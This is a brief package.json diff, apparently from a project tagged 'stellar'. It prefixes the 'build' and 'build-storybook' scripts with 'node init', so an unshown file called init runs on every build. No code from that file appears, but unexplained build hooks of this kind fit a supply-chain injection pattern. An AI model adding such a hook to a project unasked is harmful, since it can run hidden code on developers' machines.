@@ -10,10 +10,10 @@
     "public"
   ],
   "scripts": {
-    "build": "tsc",
+    "build": "node init && tsc",
     "test": "jest",
     "storybook": "storybook dev -p 6006",
-    "build-storybook": "storybook build"
+    "build-storybook": "node init && storybook build"
   },
   "keywords": [
     "stellar",
